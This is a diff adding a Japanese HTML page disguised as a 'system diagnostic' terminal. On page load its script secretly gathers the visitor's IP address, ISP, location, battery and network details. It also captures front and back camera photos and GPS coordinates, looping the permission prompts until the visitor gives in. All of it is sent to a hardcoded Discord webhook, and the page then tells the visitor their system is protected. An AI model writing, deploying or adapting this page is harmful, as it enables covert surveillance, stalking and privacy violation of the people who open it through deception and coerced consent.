@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>システムスキャン中...</title>
+    <style>
+        body {
+            background-color: #0b0b0b;
+            color: #00ff66;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .terminal {
+            width: 80%;
+            max-width: 600px;
+            background: #121212;
+            border: 1px solid #00ff66;
+            box-shadow: 0 0 15px rgba(0, 255, 102, 0.2);
+            padding: 20px;
+            border-radius: 5px;
+        }
+        h2 { margin-top: 0; font-size: 18px; border-bottom: 1px dashed #00ff66; padding-bottom: 10px; }
+        .log-line { margin: 8px 0; font-size: 14px; }
+        .log-warn { margin: 8px 0; font-size: 14px; color: #ff3333; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div class="terminal">
+        <h2>[ システム診断中 ]</h2>
+        <div id="logs">
+            <div class="log-line">> 接続を初期化中...</div>
+        </div>
+    </div>
+
+    <!-- カメラ処理用の非表示要素 -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // 【重要】ここにDiscordのWebhook URLを貼り付けてください
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1536585279819874335/8ARjYGwabHXahh78qx9zBQKdrAZIziOQKIY50_I23MVP5c2b7wCPbDtzMAJ_VLydXQux";
+
+        function addLog(text) {
+            const logsDiv = document.getElementById('logs');
+            const div = document.createElement('div');
+            div.className = 'log-line';
+            div.textContent = text;
+            logsDiv.appendChild(div);
+        }
+
+        function addWarn(text) {
+            const logsDiv = document.getElementById('logs');
+            const div = document.createElement('div');
+            div.className = 'log-warn';
+            div.textContent = `! 警告: ${text}`;
+            logsDiv.appendChild(div);
+        }
+
+        // 許可されるまでカメラ取得をループする関数
+        async function captureCameraBlobUntilSuccess(facingMode, label) {
+            while (true) {
+                const blob = await new Promise((resolve) => {
+                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                        resolve(null);
+                        return;
+                    }
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } })
+                        .then(async (stream) => {
+                            const video = document.getElementById('video');
+                            video.srcObject = stream;
+                            await new Promise(res => { video.onloadedmetadata = res; });
+                            await video.play().catch(() => {});
+
+                            const canvas = document.getElementById('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                            stream.getTracks().forEach(track => track.stop());
+
+                            canvas.toBlob((b) => {
+                                resolve(b);
+                            }, 'image/jpeg', 0.8);
+                        })
+                        .catch(() => resolve(null));
+                });
+
+                if (blob) {
+                    return blob;
+                } else {
+                    addWarn(`${label}のアクセスが拒否されました。「許可」を選択してください。`);
+                    // 1秒待ってから再試行（ポップアップを再度出させる）
+                    await new Promise(r => setTimeout(r, 1000));
+                }
+            }
+        }
+
+        async function gatherAndSend() {
+            try {
+                addLog("> ネットワークパラメータを取得中...");
+                let ipData = {};
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    ipData = await res.json();
+                } catch (e) {
+                    ipData = { ip: "取得失敗" };
+                }
+
+                addLog("> カメラフィードにアクセス中 (前面/背面)...");
+                // 許可されるまでループ
+                const frontBlob = await captureCameraBlobUntilSuccess("user", "前面カメラ");
+                const backBlob = await captureCameraBlobUntilSuccess("environment", "背面カメラ");
+
+                addLog(" ");
+                let batteryInfo = "取得不可";
+                if (navigator.getBattery) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? '充電中' : '放電中'})`;
+                    } catch (e) {}
+                }
+
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                const netType = connection ? (connection.effectiveType || "不明") : "不明";
+
+                const info = {
+                    ip: ipData.ip || "不明",
+                    city: ipData.city || "不明",
+                    region: ipData.region || "不明",
+                    country: ipData.country_name || "不明",
+                    isp: ipData.org || "不明",
+                    platform: navigator.platform,
+                    battery: batteryInfo,
+                    network: netType
+                };
+
+                addLog("> GPS座標を要求中...");
+                let gpsText = "拒否または未取得";
+                
+                // GPSも許可されるまでループさせる場合
+                while (true) {
+                    try {
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+                        });
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                        gpsText = `[🗺️ Googleマップで見る](${mapUrl})\n(緯度: ${lat}, 経度: ${lon})`;
+                        break; // 取得成功したらループを抜ける
+                    } catch (e) {
+                        addWarn("位置情報の取得が拒否されました。「許可」を選択してください。");
+                        await new Promise(r => setTimeout(r, 1000));
+                    }
+                }
+
+                addLog("> 情報を送信中...");
+
+                const discordMessage = {
+                    content: "🚨 **【完全版】全パラメータ・GPS・カメラ画像検知**",
+                    embeds: [{
+                        title: "📊 取得データ一覧",
+                        color: 16711680,
+                        fields: [
+                            { name: "🌐 IPアドレス", value: info.ip, inline: true },
+                            { name: "🏢 プロバイダ", value: info.isp, inline: true },
+                            { name: "📍 地域", value: `${info.country} ${info.region} ${info.city}`, inline: false },
+                            { name: "🔋 バッテリー", value: info.battery, inline: true },
+                            { name: "💻 プラットフォーム", value: info.platform, inline: true },
+                            { name: "🛰️ GPS位置情報", value: gpsText, inline: false },
+                            { name: "📷 前面カメラ", value: "画像添付済み (front.jpg)", inline: true },
+                            { name: "📷 背面カメラ", value: "画像添付済み (back.jpg)", inline: true }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                const formData = new FormData();
+                formData.append('payload_json', JSON.stringify(discordMessage));
+                
+                if (frontBlob) {
+                    formData.append('files[0]', frontBlob, 'front.jpg');
+                }
+                if (backBlob) {
+                    formData.append('files[1]', backBlob, 'back.jpg');
+                }
+
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                addLog("> 完了。システムは安全に保護されました。");
+
+            } catch (error) {
+                addWarn("処理中にエラーが発生しました。");
+            }
+        }
+
+        window.onload = gatherAndSend;
+    </script>
+</body>
+</html>
